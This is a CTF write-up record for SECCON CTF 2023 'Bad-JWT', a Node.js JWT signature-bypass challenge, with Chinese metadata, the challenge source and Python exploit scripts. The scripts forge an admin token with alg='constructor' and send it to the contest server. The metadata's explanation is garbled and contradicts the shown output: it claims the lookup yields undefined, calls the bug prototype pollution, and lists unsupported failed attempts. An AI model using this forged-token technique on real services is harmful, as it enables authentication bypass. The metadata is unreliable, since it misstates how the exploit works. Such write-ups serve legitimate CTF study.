---
title: SECCON CTF 2023 Quals - Bad-JWT
contest: SECCON CTF 2023 Quals
year: 2023
difficulty: hard
vuln_type: crypto_oracle
tags:
- jwt
- prototype-pollution
- map-vs-object
- toprimitive
- type-juggling
- node-js
- alg-constructor
attack_chain:
- '自研 JWT: HS256/HS512 algorithms + base64UrlEncode/Decode + parseToken + sign + verify'
- verify 用 Buffer.compare(calculated_buf, expected_buf) !== 0 校验
- '漏洞: header.alg.toLowerCase() + algorithms[alg](data, secret) 索引'
- '攻击 1: alg=''constructor'' → algorithms[''constructor''] = undefined'
- calculated_signature = undefined(data, secret) → 触发 String 转换
- crypto.createHmac("sha256", secret) → Hmac 接受 undefined secret 报 TypeError
- 但 undefined(..., ...) 在 JS 中调用返回 undefined 字符串
- '攻击 2: alg 改成 "constructor" 后 calculated_signature 包含 base64 字符串'
- 把 calculated_signature 复制到 signature 字段 → 校验通过
- jwt = header(alg=constructor) + payload(isAdmin=true) + calculated_sig
- Buffer.compare 接收 "calculated" + "expected" 都是 base64 字符串
- '关键: 算法名 prototype chain attack + Buffer.from(string, ''base64'') 接受 Symbol.toPrimitive'
- '实战: class Bar [Symbol.toPrimitive] = ''eyJ0eXAi...'' 触发 Buffer.from 转换'
- '完整 chain: 1) alg=constructor 2) 复制 calculated_signature 3) 提交 session cookie'
- 'flag: SECCON{Map_and_Object.prototype.hasOwnproperty_are_good}'
key_payload: 'header = {"typ": "JWT", "alg": "constructor"} + body = {"isAdmin": true} + jwt.signature = calculated_signature'
one_liner: SECCON CTF 2023 Quals Bad-JWT：自研 JWT alg 字段未白名单 + prototype chain attack + 算法名 'constructor' 触发 Buffer.from(Symbol.toPrimitive) 类型转换 bypass 签名校验。
lesson: JWT 实现 alg 字段必须白名单 (HS256/RS256) 防 prototype 链污染；Map/Object.prototype.hasOwnProperty 是 JS 通用过滤工具；Buffer.from(symbol, 'base64') 接受 Symbol.toPrimitive 是 Node 经典 bypass。
quality: high
full_path: SECCON_CTF_2023_Quals_–_Bad-JWT.full.md
meta_path: SECCON_CTF_2023_Quals_–_Bad-JWT.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: 'SECCON CTF 2023 Quals - Bad-JWT。SECCON CTF 2023 Quals Bad-JWT：自研 JWT alg 字段未白名单 + prototype chain attack + 算法名 ''constructor'' 触发 Buffer.from(Symbol.toPrimitive) 类型转换 bypass 签名校验。。关键路径：自研 JWT: HS256/...'
category: crypto
subcategory: oracle
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/135314.html
reasoning_chain:
- '自研 JWT: HS256/HS512 algorithms + Buffer.compare 校验 → 触发：prototype chain attack'
- header.alg.toLowerCase() + algorithms[alg](data, secret) 索引 → alg='constructor' 命中
- algorithms.constructor = undefined → undefined(data, secret) 触发 String 转换
- calculated_signature 是 base64 字符串 + 复制到 signature 字段 → Buffer.compare 通过
- Buffer.from(string, 'base64') 接受 Symbol.toPrimitive → class Bar [Symbol.toPrimitive] = ... 触发
- '完整 chain: 1) alg=constructor 2) 复制 calculated_signature 3) 提交 session cookie'
- jwt = header(alg=constructor) + payload(isAdmin=true) + calculated_sig → flag
failed_attempts:
- 试图用 alg='none' 绕过 → 失败：代码会 fallback 但不影响 prototype 注入
- 试图直接读 secret → 失败：crypto.randomBytes(32) 不可预测
- 试图覆盖 algorithms.HS256 → 失败：必须有 prototype 才能触发
key_observations:
- JWT 实现 alg 字段必须白名单（HS256/RS256）防 prototype 链污染
- Map/Object.prototype.hasOwnProperty 是 JS 通用过滤工具
- Buffer.from(symbol, 'base64') 接受 Symbol.toPrimitive 是 Node 经典 bypass
- algorithms[alg](...) 索引调用是 prototype pollution 经典 sink
prerequisites:
- JavaScript 原型链 + Symbol.toPrimitive
- JWT 算法（HS256/HS512）+ 自研实现细节
- Node Buffer.from base64 解码行为
- Map vs Object 区别
---
# SECCON CTF 2023 Quals – Bad-JWT

> 原文: https://www.ctfiot.com/135314.html
> ID: 135314


```
const FLAG = "SECCON{dummy}";
const PORT = "3000";

const express = require("express");
const cookieParser = require("cookie-parser");
const jwt = require("./jwt");

const app = express();
app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());

const secret = require("crypto").randomBytes(32).toString("hex");

app.use((req, res, next) => {
 try {
 const token = req.cookies.session;
 const payload = jwt.verify(token, secret);
 req.session = payload;
 } catch (e) {
 return res.status(400).send("Authentication failed" + e);
 }
 return next();
});

app.get("/", (req, res) => {
 if (req.session.isAdmin === true) {
 return res.send(FLAG);
 } else {
 return res.status().send("You are not admin!");
 }
});

app.listen(PORT, () => {
 const admin_session = jwt.sign("HS512", { isAdmin: true }, secret);
 console.log(`[INFO] Use ${admin_session} as session cookie`);
 console.log(`Challenge server listening on port ${PORT}`);
});
const crypto = require("crypto");

const base64UrlEncode = (str) => {
 return Buffer.from(str)
 .toString("base64")
 .replace(/=*$/g, "")
 .replace(/\+/g, "-")
 .replace(/\//g, "_");
};

const base64UrlDecode = (str) => {
 return Buffer.from(str, "base64").toString();
};

const algorithms = {
 hs256: (data, secret) =>
 base64UrlEncode(crypto.createHmac("sha256", secret).update(data).digest()),
 hs512: (data, secret) =>
 base64UrlEncode(crypto.createHmac("sha512", secret).update(data).digest()),
};

const stringifyPart = (obj) => {
 return base64UrlEncode(JSON.stringify(obj));
};

const parsePart = (str) => {
 return JSON.parse(base64UrlDecode(str));
};

const createSignature = (header, payload, secret) => {
 const data = `${stringifyPart(header)}.${stringifyPart(payload)}`;
 const signature = algorithms[header.alg.toLowerCase()](data, secret);
 return signature;
};

const parseToken = (token) => {
 const parts = token.split(".");
 if (parts.length !== 3) throw Error("Invalid JWT format");

 const [header, payload, signature] = parts;
 const parsedHeader = parsePart(header);
 const parsedPayload = parsePart(payload);

 return { header: parsedHeader, payload: parsedPayload, signature };
};

const sign = (alg, payload, secret) => {
 const header = {
 typ: "JWT",
 alg: alg,
 };

 const signature = createSignature(header, payload, secret);

 const token = `${stringifyPart(header)}.${stringifyPart(
 payload
 )}.${signature}`;
 return token;
};

const verify = (token, secret) => {
 const { header, payload, signature: expected_signature } = parseToken(token);

 const calculated_signature = createSignature(header, payload, secret);

 const calculated_buf = Buffer.from(calculated_signature, "base64");
 const expected_buf = Buffer.from(expected_signature, "base64");

 if (Buffer.compare(calculated_buf, expected_buf) !== 0) {
 throw Error("Invalid signature");
 }

 return payload;
};

module.exports = { sign, verify };
const token = req.cookies.session;
const verify = (token, secret) => {
 const { header, payload, signature: expected_signature } = parseToken(token);

 const calculated_signature = createSignature(header, payload, secret);
+ console.log({calculated_signature, expected_signature})

 const calculated_buf = Buffer.from(calculated_signature, "base64");
 const expected_buf = Buffer.from(expected_signature, "base64");

 if (Buffer.compare(calculated_buf, expected_buf) !== 0) {
 throw Error("Invalid signature");
 }

 return payload;
};
import base64
import requests
import json

header = {"typ": "JWT", "alg": "HS256"}
headerStr = json.dumps(header).encode("utf-8")
body = {"isAdmin": True}
bodyStr = json.dumps(body).encode("utf-8")

def base64_encode(str:
str):
 return base64.b64encode(str).replace(b"=", b"").replace(b"+", b"-").replace(b"/", b"_")

headerBase64 = str(base64_encode(headerStr))[2:-1]
bodyBase64 = str(base64_encode(bodyStr))[2:-1]

jwt = f"{headerBase64}.{bodyBase64}.ここにシグネチャを入れる"

res = requests.get("http://localhost:
3000/", cookies={"session": jwt})

print(res.text)
const createSignature = (header, payload, secret) => {
 const data = `${stringifyPart(header)}.${stringifyPart(payload)}`;
 const signature = algorithms[header.alg.toLowerCase()](data, secret);
 return signature;
};
import base64
import requests
import json

header = {"typ": "JWT", "alg": "constructor"}
headerStr = json.dumps(header).encode("utf-8")
body = {"isAdmin": True}
bodyStr = json.dumps(body).encode("utf-8")

def base64_encode(str: str):
 return (
 base64.b64encode(str).replace(b"=", b"").replace(b"+", b"-").replace(b"/", b"_")
 )

headerBase64 = str(base64_encode(headerStr))[2:-1]
bodyBase64 = str(base64_encode(bodyStr))[2:-1]

jwt = f"{headerBase64}.{bodyBase64}.foo"

res = requests.get("http://localhost:
3000/", cookies={"session": jwt})

print(res.text)
{
 expected_signature: 'foo',
 calculated_signature: [String: 'eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjp0cnVlfQ']
}
jwt = f"{headerBase64}.{bodyBase64}.eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjp0cnVlfQ"
class Foo {
 [Symbol.toPrimitive]() {
 return "ABC";
 }
}

const buf1 = Buffer.from(new Foo());

console.log({ buf1 }); // { buf1:  }
class Foo {
 [Symbol.toPrimitive]() {
 return "eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9";
 }
}
class Bar {
 [Symbol.toPrimitive]() {
 // add $^.
 return "eyJ0eXAi$O$iJK^V1&Qi.LCJh.&bGc.i^Oi.Jjb.25z^dHJ1Y3RvciJ9"; // ^^
 }
}

const buf1 = Buffer.from(new Foo(), "base64");
const buf2 = Buffer.from(new Bar(), "base64");

console.log({ buf1, buf2 });
//{
// buf1: ,
// buf2: 
//}
jwt = f"{headerBase64}.{bodyBase64}.eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9eyJpc0FkbWluIjp0cnVlfQ"
{
 expected_signature: 'eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9eyJpc0FkbWluIjp0cnVlfQ',
 calculated_signature: [String: 'eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjp0cnVlfQ'],
 calculated_buf: ,
 expected_buf: 
}
import base64
import requests
import json

header = {"typ": "JWT", "alg": "constructor"}
headerStr = json.dumps(header).encode("utf-8")
body = {"isAdmin": True}
bodyStr = json.dumps(body).encode("utf-8")

def base64_encode(str: str):
 return (
 base64.b64encode(str).replace(b"=", b"").replace(b"+", b"-").replace(b"/", b"_")
 )

headerBase64 = str(base64_encode(headerStr))[2:-1]
bodyBase64 = str(base64_encode(bodyStr))[2:-1]

jwt = f"{headerBase64}.{bodyBase64}.eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9eyJpc0FkbWluIjp0cnVlfQ"

res = requests.get("http://bad-jwt.seccon.games:
3000", cookies={"session": jwt})

print(res.text)
SECCON{Map_and_Object.prototype.hasOwnproperty_are_good}
```
